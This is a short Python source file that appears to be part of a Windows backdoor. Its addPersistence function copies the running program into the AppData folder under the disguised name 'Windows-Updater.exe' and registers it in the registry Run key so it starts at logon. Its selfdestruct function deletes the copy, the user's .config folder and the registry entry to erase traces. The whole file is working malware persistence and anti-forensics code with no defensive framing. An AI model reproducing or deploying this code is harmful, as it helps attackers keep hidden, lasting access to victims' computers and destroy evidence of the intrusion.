import os
import subprocess as sp
import shutil
import sys

def addPersistence():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if os.path.exists(backdoor_location):
        return "already-enabled"
    try:
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)
        return "enabled"
    except Exception as e:
        return f"error: {e}"


def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME


def selfdestruct():
    try:
        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        config_location = fr'C:\Users\{getUsername()}\.config'
        if os.path.exists(update_location):
            os.remove(update_location)
        if os.path.exists(config_location):
            shutil.rmtree(config_location)
        sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
        return True

    except Exception as e:
        return e